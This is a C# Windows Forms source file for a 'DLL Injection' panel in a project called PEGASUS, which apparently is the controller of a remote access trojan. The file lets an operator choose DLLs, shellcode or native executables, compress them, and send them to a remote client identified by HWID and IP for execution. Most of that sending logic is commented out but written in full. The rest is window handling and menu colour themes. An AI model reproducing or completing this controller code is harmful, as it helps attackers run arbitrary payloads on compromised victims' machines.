using System;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using PEGASUS.Metafora_Dedomenon;


namespace PEGASUS.Design
{
    public partial class DLLInjectionPanel : Form
    {

        private void DLLInjectionPanel_Load(object sender, EventArgs e)
        {
            /*
            foreach (ToolStripMenuItem I in managedContextMenuStrip.Items)
            {
                I.BackColor = Color.White;
                I.ForeColor = Color.FromArgb(64, 64, 64);
            }
            managedContextMenuStrip.Renderer = new ToolStripProfessionalRenderer(new ControlsDrawing.LightMenuColorTable());

            foreach (ToolStripMenuItem I in unmanagedContextMenuStrip.Items)
            {
                I.BackColor = Color.White;
                I.ForeColor = Color.FromArgb(64, 64, 64);
            }
            unmanagedContextMenuStrip.Renderer = new ToolStripProfessionalRenderer(new ControlsDrawing.LightMenuColorTable());

            foreach (ToolStripMenuItem I in shellCodeContextMenuStrip.Items)
            {
                I.BackColor = Color.White;
                I.ForeColor = Color.FromArgb(64, 64, 64);
            }
            shellCodeContextMenuStrip.Renderer = new ToolStripProfessionalRenderer(new ControlsDrawing.LightMenuColorTable());

            foreach (ToolStripMenuItem I in nativePEContextMenuStrip.Items)
            {
                I.BackColor = Color.White;
                I.ForeColor = Color.FromArgb(64, 64, 64);
            }
            nativePEContextMenuStrip.Renderer = new ToolStripProfessionalRenderer(new ControlsDrawing.LightMenuColorTable());
            */
        }

        public string ClientHWID { get; set; }
        public string IP_Origin { get; set; }

        public DLLInjectionPanel(string ClientHWID, string IP_Origin)
        {
            this.ClientHWID = ClientHWID;
            this.IP_Origin = IP_Origin;
            InitializeComponent();
        }

        private void ExecuteDllForm_Load(object sender, EventArgs e)
        {
            /*
            foreach (ToolStripMenuItem I in managedContextMenuStrip.Items)
            {
                I.BackColor = Color.White;
                I.ForeColor = Color.FromArgb(64, 64, 64);
            }
            managedContextMenuStrip.Renderer = new ToolStripProfessionalRenderer(new ControlsDrawing.LightMenuColorTable());

            foreach (ToolStripMenuItem I in unmanagedContextMenuStrip.Items)
            {
                I.BackColor = Color.White;
                I.ForeColor = Color.FromArgb(64, 64, 64);
            }
            unmanagedContextMenuStrip.Renderer = new ToolStripProfessionalRenderer(new ControlsDrawing.LightMenuColorTable());

            foreach (ToolStripMenuItem I in shellCodeContextMenuStrip.Items)
            {
                I.BackColor = Color.White;
                I.ForeColor = Color.FromArgb(64, 64, 64);
            }
            shellCodeContextMenuStrip.Renderer = new ToolStripProfessionalRenderer(new ControlsDrawing.LightMenuColorTable());

            foreach (ToolStripMenuItem I in nativePEContextMenuStrip.Items)
            {
                I.BackColor = Color.White;
                I.ForeColor = Color.FromArgb(64, 64, 64);
            }
            nativePEContextMenuStrip.Renderer = new ToolStripProfessionalRenderer(new ControlsDrawing.LightMenuColorTable());
            */
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void addToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ListViewItem I = new ListViewItem();

            using (OpenFileDialog o = new OpenFileDialog())
            {
                o.DefaultExt = ".dll";
                if (o.ShowDialog() == DialogResult.OK)
                {
                    I.Text = o.FileName;
                    I.SubItems.Add(Numeric2Bytes(new FileInfo(o.FileName).Length));
                    unmanagedListView.Items.Add(I);
                }
            }
        }
        private static string ThreeNonZeroDigits(double value)
        {
            if (value >= 100)
            {
                // No digits after the decimal.
                return Microsoft.VisualBasic.Strings.Format(Convert.ToInt32(value));
            }
            else if (value >= 10)
            {
                // One digit after the decimal.
                return value.ToString("0.0");
            }
            else
            {
                return value.ToString("0.00");
            }
        }
        public static string Numeric2Bytes(double b)
        {
            string tempNumeric2Bytes = null;
            string[] bSize = new string[9];
            int i = 0;

            bSize[0] = "Bytes";
            bSize[1] = "KB"; //Kilobytes
            bSize[2] = "MB"; //Megabytes
            bSize[3] = "GB"; //Gigabytes
            bSize[4] = "TB"; //Terabytes
            bSize[5] = "PB"; //Petabytes
            bSize[6] = "EB"; //Exabytes
            bSize[7] = "ZB"; //Zettabytes
            bSize[8] = "YB"; //Yottabytes

            double b2 = (double)b; // Make sure var is a Double (not just
            // variant)
            for (i = bSize.GetUpperBound(0); i >= 0; i--)
            {
                if (b2 >= (Math.Pow(1024, i)))
                {
                    tempNumeric2Bytes = ThreeNonZeroDigits(b2 / (Math.Pow(1024, i))) + " " + bSize[i];
                    break;
                }
            }
            return tempNumeric2Bytes;
        }

        private void removeToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (unmanagedListView.SelectedItems.Count == 1)
            {
                unmanagedListView.SelectedItems[0].Remove();
            }
        }

        private void injectToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (unmanagedListView.SelectedItems.Count == 1)
            {
                /*
                byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(unmanagedListView.SelectedItems[0].Text), 1);
                Client C = Client.ClientDictionary[this.IP_Origin];
                api.Data D = new api.Data();
                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
                D.Plugin = Plugins.Execute;
                D.IP_Origin = C.IP;
                D.HWID = C.HWID;
                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.EXEC_NATIVE_DLL, b, Utilities.SplitPath(unmanagedListView.SelectedItems[0].Text) };
                Task.Run(() => C.SendData(D.Serialize()));
                */
            }
        }
        /*
private void addToolStripMenuItem_Click(object sender, EventArgs e)
{
ListViewItem I = new ListViewItem();

using (OpenFileDialog o = new OpenFileDialog())
{
o.DefaultExt = ".dll";
if (o.ShowDialog() == DialogResult.OK)
{
I.Text = o.FileName;
string S = Interaction.InputBox("Insert the entrypoint of your dll : [Namespace.Class.Function]");
I.SubItems.Add(S);
I.SubItems.Add(Utilities.Numeric2Bytes(new FileInfo(o.FileName).Length));
managedListView.Items.Add(I);
}
}
}

private void removeToolStripMenuItem_Click(object sender, EventArgs e)
{
if (managedListView.SelectedItems.Count == 1)
{
managedListView.SelectedItems[0].Remove();
}
}

private void injectToolStripMenuItem_Click(object sender, EventArgs e)
{
if (managedListView.SelectedItems.Count == 1)
{
byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(managedListView.SelectedItems[0].Text), 1);
Client C = Client.ClientDictionary[this.IP_Origin];
api.Data D = new api.Data();
D.Type = Shared.PacketTypes.PacketType.PLUGIN;
D.Plugin = Plugins.Execute;
D.IP_Origin = C.IP;
D.HWID = C.HWID;
D.DataReturn = new object[] { Shared.PacketTypes.PacketType.EXEC_MANAGED_DLL, b, managedListView.SelectedItems[0].SubItems[1].Text, Utilities.SplitPath(managedListView.SelectedItems[0].Text) };
Task.Run(() => C.SendData(D.Serialize()));
}
}

private void addToolStripMenuItem1_Click(object sender, EventArgs e)
{
ListViewItem I = new ListViewItem();

using (OpenFileDialog o = new OpenFileDialog())
{
o.DefaultExt = ".dll";
if (o.ShowDialog() == DialogResult.OK)
{
I.Text = o.FileName;
I.SubItems.Add(Utilities.Numeric2Bytes(new FileInfo(o.FileName).Length));
unmanagedListView.Items.Add(I);
}
}
}

private void removeToolStripMenuItem1_Click(object sender, EventArgs e)
{
if (unmanagedListView.SelectedItems.Count == 1)
{
unmanagedListView.SelectedItems[0].Remove();
}
}

private void injectToolStripMenuItem1_Click(object sender, EventArgs e)
{
if (unmanagedListView.SelectedItems.Count == 1)
{
byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(unmanagedListView.SelectedItems[0].Text), 1);
Client C = Client.ClientDictionary[this.IP_Origin];
api.Data D = new api.Data();
D.Type = Shared.PacketTypes.PacketType.PLUGIN;
D.Plugin = Plugins.Execute;
D.IP_Origin = C.IP;
D.HWID = C.HWID;
D.DataReturn = new object[] { Shared.PacketTypes.PacketType.EXEC_NATIVE_DLL, b, Utilities.SplitPath(unmanagedListView.SelectedItems[0].Text) };
Task.Run(() => C.SendData(D.Serialize()));
}
}

private void toolStripMenuItem1_Click(object sender, EventArgs e)
{
ListViewItem I = new ListViewItem();

using (OpenFileDialog o = new OpenFileDialog())
{
o.DefaultExt = ".dll";
if (o.ShowDialog() == DialogResult.OK)
{
I.Text = o.FileName;
I.SubItems.Add(Utilities.Numeric2Bytes(new FileInfo(o.FileName).Length));
shellCodeListView.Items.Add(I);
}
}
}

private void toolStripMenuItem2_Click(object sender, EventArgs e)
{
if (shellCodeListView.SelectedItems.Count == 1)
{
shellCodeListView.SelectedItems[0].Remove();
}
}

private void toolStripMenuItem3_Click(object sender, EventArgs e)
{
if (shellCodeListView.SelectedItems.Count == 1)
{
byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(shellCodeListView.SelectedItems[0].Text), 1);
Client C = Client.ClientDictionary[this.IP_Origin];
api.Data D = new api.Data();
D.Type = Shared.PacketTypes.PacketType.PLUGIN;
D.Plugin = Plugins.Execute;
D.IP_Origin = C.IP;
D.HWID = C.HWID;
D.DataReturn = new object[] { Shared.PacketTypes.PacketType.EXEC_SHELL_CODE, b, Utilities.SplitPath(shellCodeListView.SelectedItems[0].Text) };
Task.Run(() => C.SendData(D.Serialize()));
}
}

private void toolStripMenuItem4_Click(object sender, EventArgs e)
{
ListViewItem I = new ListViewItem();

using (OpenFileDialog o = new OpenFileDialog())
{
o.DefaultExt = ".dll";
if (o.ShowDialog() == DialogResult.OK)
{
I.Text = o.FileName;
I.SubItems.Add(Utilities.Numeric2Bytes(new FileInfo(o.FileName).Length));
nativePEListView.Items.Add(I);
}
}
}

private void toolStripMenuItem5_Click(object sender, EventArgs e)
{
if (nativePEListView.SelectedItems.Count == 1)
{
nativePEListView.SelectedItems[0].Remove();
}
}

private void toolStripMenuItem6_Click(object sender, EventArgs e)
{
if (nativePEListView.SelectedItems.Count == 1)
{
byte[] b = Shared.Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(nativePEListView.SelectedItems[0].Text), 1);
Client C = Client.ClientDictionary[this.IP_Origin];
api.Data D = new api.Data();
D.Type = Shared.PacketTypes.PacketType.PLUGIN;
D.Plugin = Plugins.Execute;
D.IP_Origin = C.IP;
D.HWID = C.HWID;
D.DataReturn = new object[] { Shared.PacketTypes.PacketType.EXEC_NATIVE_EXE, b, Utilities.SplitPath(nativePEListView.SelectedItems[0].Text) };
Task.Run(() => C.SendData(D.Serialize()));
}
}
}

internal class ControlsDrawing
{
[System.Runtime.InteropServices.DllImport("user32.dll")]
private static extern bool ShowScrollBar(IntPtr hWnd, int wBar, bool bShow);
private enum ScrollBarDirection
{
SB_HORZ = 0,
SB_VERT = 1,
SB_CTL = 2,
SB_BOTH = 3
}

public static void Enable(ListView listView)
{
PropertyInfo aProp = typeof(Control).GetProperty("DoubleBuffered", BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.Public);
aProp.SetValue(listView, true, null);
}
public static void Enable(TabControl tabControl)
{
PropertyInfo aProp = typeof(Control).GetProperty("DoubleBuffered", BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.Public);
aProp.SetValue(tabControl, true, null);
}
public static void Enable(ContextMenuStrip contextMenuStrip)
{
PropertyInfo aProp = typeof(Control).GetProperty("DoubleBuffered", BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.Public);
aProp.SetValue(contextMenuStrip, true, null);
}
public static void Enable(PictureBox pictureBox)
{
PropertyInfo aProp = typeof(Control).GetProperty("DoubleBuffered", BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.Public);
aProp.SetValue(pictureBox, true, null);
}
public static void Enable(Label label)
{
PropertyInfo aProp = typeof(Control).GetProperty("DoubleBuffered", BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.Public);
aProp.SetValue(label, true, null);
}

//Thx to stackoverflow  : https://stackoverflow.com/questions/32307778/change-the-border-color-of-winforms-menu-dropdown-list
/// <summary>
/// Dark Theme for Context Menu
/// </summary>
internal class DarkMenuColorTable : ProfessionalColorTable
{
public DarkMenuColorTable()
{
// see notes
base.UseSystemColors = false;
}
public override System.Drawing.Color MenuBorder
{
get { return System.Drawing.Color.FromArgb(25, 27, 38); }
}
public override System.Drawing.Color MenuItemBorder
{
get { return System.Drawing.Color.FromArgb(25, 27, 38); }
}
public override Color MenuItemSelected
{
get { return Color.FromArgb(20, 193, 255); }//20; 193; 255    0, 173, 239
}
public override Color MenuItemSelectedGradientBegin
{
get { return System.Drawing.Color.FromArgb(25, 27, 38); }
}
public override Color MenuItemSelectedGradientEnd
{
get { return System.Drawing.Color.FromArgb(25, 27, 38); }
}
public override Color MenuStripGradientBegin
{
get { return System.Drawing.Color.FromArgb(25, 27, 38); }
}
public override Color MenuStripGradientEnd
{
get { return System.Drawing.Color.FromArgb(25, 27, 38); }
}
public override Color ImageMarginGradientBegin
{
get { return Color.FromArgb(0, 173, 239); }
}
public override Color ImageMarginGradientMiddle
{
get { return Color.FromArgb(0, 173, 239); }
}
public override Color ImageMarginGradientEnd
{
get { return Color.FromArgb(0, 173, 239); }
}
public override Color ToolStripDropDownBackground
{
get { return Color.FromArgb(0, 173, 239); }
}
}

/// <summary>
/// Light Theme for Context Menu
/// </summary>
internal class LightMenuColorTable : ProfessionalColorTable
{
public LightMenuColorTable()
{
// see notes
base.UseSystemColors = false;
}
public override System.Drawing.Color MenuBorder
{
get { return Color.White; }
}
public override System.Drawing.Color MenuItemBorder
{
get { return Color.White; }
}
public override Color MenuItemSelected
{
get { return Color.FromArgb(20, 193, 255); }
}
public override Color MenuItemSelectedGradientBegin
{
get { return Color.White; }
}
public override Color MenuItemSelectedGradientEnd
{
get { return Color.White; }
}
public override Color MenuStripGradientBegin
{
get { return Color.White; }
}
public override Color MenuStripGradientEnd
{
get { return Color.White; }
}
public override Color ImageMarginGradientBegin
{
get { return Color.FromArgb(0, 173, 239); }
}
public override Color ImageMarginGradientMiddle
{
get { return Color.FromArgb(0, 173, 239); }
}
public override Color ImageMarginGradientEnd
{
get { return Color.FromArgb(0, 173, 239); }
}
public override Color ToolStripDropDownBackground
{
get { return Color.FromArgb(0, 173, 239); }
}
}

*/

    }
}
